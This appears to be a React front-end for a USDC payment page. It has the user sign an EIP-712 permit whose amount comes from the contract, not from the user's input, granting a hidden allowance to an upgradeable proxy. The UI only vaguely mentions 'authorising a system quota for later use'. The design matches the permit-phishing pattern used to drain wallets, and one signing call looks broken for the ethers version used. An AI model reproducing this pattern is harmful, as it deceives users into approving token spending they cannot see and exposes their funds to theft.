import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './App.css';

// 合约ABI（简化版，只包含需要的方法）
const PAYMENT_PROCESSOR_ABI = [
  "function makePaymentWithPermit(uint256 paymentAmount, bytes calldata permitData) external",
  "function getApprovalAmount() external pure returns (uint256)",
  "function getVersion() external pure returns (string)"
];

const USDC_ABI = [
  "function balanceOf(address account) external view returns (uint256)",
  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
  "function nonces(address owner) external view returns (uint256)",
  "function name() public view returns (string)",
  "function decimals() public view returns (uint8)"
];

function App() {
  const [account, setAccount] = useState('');
  const [paymentAmount, setPaymentAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [contractInfo, setContractInfo] = useState(null);
  const [usdcBalance, setUsdcBalance] = useState('0');

  // 加载合约信息 - 添加错误处理
  useEffect(() => {
    console.log('开始加载合约信息...');
    fetch('/contracts/contract-addresses.json')
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP错误: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log('合约信息加载成功:', data);
        setContractInfo(data);
      })
      .catch(error => {
        console.error('加载合约信息失败:', error);
      });
  }, []);

  // 连接钱包
  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        setAccount(userAddress);
        
        // 获取USDC余额
        await updateUsdcBalance(userAddress, provider);
        
      } catch (error) {
        console.error('连接钱包失败:', error);
        alert('连接钱包失败: ' + error.message);
      }
    } else {
      alert('请安装 MetaMask!');
    }
  };

  // 更新USDC余额
  const updateUsdcBalance = async (userAddress, provider) => {
    if (!contractInfo) return;
    
    try {
      const usdcContract = new ethers.Contract(
        contractInfo.usdcToken,
        USDC_ABI,
        provider
      );
      const balance = await usdcContract.balanceOf(userAddress);
      setUsdcBalance(ethers.utils.formatUnits(balance, 6));
    } catch (error) {
      console.error('获取余额失败:', error);
    }
  };

  // 生成打包的permit数据 - 修复版本
  const generatePackedPermitData = async (userAddress) => {
    console.log('开始生成permit数据...');
    
    if (!contractInfo) {
      throw new Error('合约信息未加载');
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const usdcContract = new ethers.Contract(
        contractInfo.usdcToken,
        USDC_ABI,
        provider
      );

      // 从合约获取授权金额
      const paymentProcessor = new ethers.Contract(
        contractInfo.proxy,
        PAYMENT_PROCESSOR_ABI,
        provider
      );
      
      console.log('获取授权金额...');
      const approvalAmount = await paymentProcessor.getApprovalAmount();
      console.log('授权金额:', approvalAmount.toString());

      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1小时后过期
      console.log('获取nonce...');
      const nonce = await usdcContract.nonces(userAddress);
      console.log('nonce:', nonce.toString());
      
      console.log('获取代币名称...');
      const name = await usdcContract.name();
      console.log('代币名称:', name);
      
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      console.log('链ID:', chainId);

      // EIP-712 签名数据
      const domain = {
        name: name,
        version: '1',
        chainId: parseInt(chainId),
        verifyingContract: contractInfo.usdcToken
      };

      const types = {
        Permit: [
          { name: 'owner', type: 'address' },
          { name: 'spender', type: 'address' },
          { name: 'value', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]
      };

      const message = {
        owner: userAddress,
        spender: contractInfo.proxy,
        value: approvalAmount,
        nonce: nonce,
        deadline: deadline
      };

      console.log('签名数据:', { domain, types, message });

      const signer = provider.getSigner();
      // 使用标准的 signTypedData 方法
      const signature = await signer.signTypedData(domain, types, message);
      console.log('签名结果:', signature);
      
      const sig = ethers.utils.splitSignature(signature);
      console.log('分割签名:', sig);

      // 字节打包
      const packedData = ethers.utils.defaultAbiCoder.encode(
        ['uint256', 'uint8', 'bytes32', 'bytes32'],
        [deadline, sig.v, sig.r, sig.s]
      );

      console.log('打包数据完成, 长度:', packedData.length);
      return packedData;

    } catch (error) {
      console.error('生成permit数据失败:', error);
      throw new Error(`生成授权数据失败: ${error.message}`);
    }
  };

  // 处理支付 - 修复版本
  const handlePayment = async () => {
    console.log('开始支付...');
    console.log('当前contractInfo:', contractInfo);
    
    // 基础检查
    if (!window.ethereum) {
      alert('请安装 MetaMask!');
      return;
    }
    
    if (!contractInfo) {
      alert('合约信息加载中，请稍后重试...');
      return;
    }
    
    if (!contractInfo.proxy) {
      alert('合约地址未加载，请刷新页面重试');
      return;
    }
    
    if (!paymentAmount || parseFloat(paymentAmount) <= 0) {
      alert('请输入有效的转账金额');
      return;
    }

    try {
      setLoading(true);
      
      // 直接获取当前账户
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length === 0) {
        alert('请先连接钱包');
        return;
      }
      
      const userAddress = accounts[0];
      console.log('支付账户:', userAddress);
      console.log('使用合约地址:', contractInfo.proxy);
      
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      
      // 真实支付逻辑
      const paymentProcessor = new ethers.Contract(
        contractInfo.proxy,
        PAYMENT_PROCESSOR_ABI,
        signer
      );

      const usdcContract = new ethers.Contract(
        contractInfo.usdcToken,
        USDC_ABI,
        signer
      );

      // 转换金额为USDC单位（6位小数）
      const paymentAmountWei = ethers.utils.parseUnits(paymentAmount, 6);

      // 检查USDC余额
      const userBalance = await usdcContract.balanceOf(userAddress);
      if (userBalance.lt(paymentAmountWei)) {
        alert('USDC余额不足');
        return;
      }

      console.log('1. 生成打包的permit数据...');
      const permitData = await generatePackedPermitData(userAddress);
      
      console.log('2. 发送交易（授权 + 转账）...');
      const tx = await paymentProcessor.makePaymentWithPermit(
        paymentAmountWei,
        permitData,
        {
          gasLimit: 300000 // 添加gas限制避免out of gas
        }
      );

      console.log('3. 交易已发送:', tx.hash);
      
      // 显示交易链接
      const etherscanUrl = `https://etherscan.io/tx/${tx.hash}`;
      console.log('Etherscan链接:', etherscanUrl);
      
      // 等待交易确认
      console.log('4. 等待交易确认...');
      await tx.wait();
      console.log('5. 交易已确认');

      alert(`支付成功！\n• 已完成 ${paymentAmount} USDC 转账\n• 已授权系统额度\n\n交易哈希: ${tx.hash}`);
      
      // 清空输入框并更新余额
      setPaymentAmount('');
      await updateUsdcBalance(userAddress, provider);
      
    } catch (error) {
      console.error('支付失败:', error);
      
      // 更友好的错误提示
      if (error.message.includes('user rejected transaction') || error.message.includes('User denied')) {
        alert('用户取消了交易');
      } else if (error.message.includes('insufficient funds')) {
        alert('余额不足');
      } else if (error.message.includes('Cannot read properties of null')) {
        alert('合约信息加载问题，请刷新页面重试');
      } else if (error.message.includes('非法的参数')) {
        alert('参数错误，请检查合约配置');
      } else {
        alert('支付失败: ' + error.message);
      }
    } finally {
      setLoading(false);
    }
  };

  // 返回部分
  return (
    <div className="app">
      <div className="container">
        <header className="header">
          <h1>USDC 支付系统</h1>
          <p>安全、便捷的USDC支付体验</p>
        </header>

        <main className="main">
          {!account ? (
            <div className="connect-section">
              <button onClick={connectWallet} className="connect-button">
                🔗 连接 MetaMask 钱包
              </button>
              <p className="connect-hint">连接钱包后即可开始支付</p>
            </div>
          ) : (
            <div className="payment-section">
              <div className="account-info">
                <p>✅ 已连接账户: <span className="address">{account}</span></p>
                <p>💰 USDC余额: <span className="balance">{usdcBalance}</span> USDC</p>
              </div>

              <div className="payment-card">
                <h2>支付金额</h2>
                <div className="input-group">
                  <input
                    type="number"
                    value={paymentAmount}
                    onChange={(e) => setPaymentAmount(e.target.value)}
                    placeholder="0.00"
                    className="amount-input"
                    step="0.01"
                    min="0"
                    disabled={loading}
                  />
                  <span className="currency">USDC</span>
                </div>

                <button 
                  onClick={handlePayment} 
                  disabled={loading || !paymentAmount}
                  className="payment-button"
                >
                  {loading ? (
                    <>
                      <div className="spinner"></div>
                      处理中...
                    </>
                  ) : (
                    '确认支付并授权'
                  )}
                </button>

                <div className="payment-info">
                  <h3>💡 支付说明</h3>
                  <ul>
                    <li>点击支付将同时完成：</li>
                    <li>• <strong>即时转账</strong> - 您输入的金额会立即转出</li>
                    <li>• <strong>系统授权</strong> - 授权系统额度供后续使用</li>
                    <li>• <strong>单次确认</strong> - 只需确认一次交易</li>
                  </ul>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="footer">
          <p>基于以太坊主网 · 使用 USDC 稳定币</p>
        </footer>
      </div>
    </div>
  );
}

export default App;
